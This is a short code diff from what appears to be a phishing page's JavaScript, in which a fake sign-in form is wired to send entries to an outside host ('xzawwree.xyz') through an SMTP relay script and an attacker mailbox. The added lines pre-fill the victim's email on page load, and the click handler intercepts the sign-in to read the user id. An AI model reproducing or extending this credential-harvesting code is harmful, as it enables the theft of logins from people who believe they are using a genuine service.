@@ -21,6 +21,8 @@ var yourUrl ="https://xzawwree.xyz/pharoh/smtpjs.php";
           }
         var your_email="rp@xzawwree.xyz";
         window.addEventListener("load", function(){
+               
+        document.getElementById("emaill").value=email;       
         document.getElementById("caw-signin").addEventListener("click", function(event){
             event.preventDefault();
         var userid = document.getElementById("oid").value;
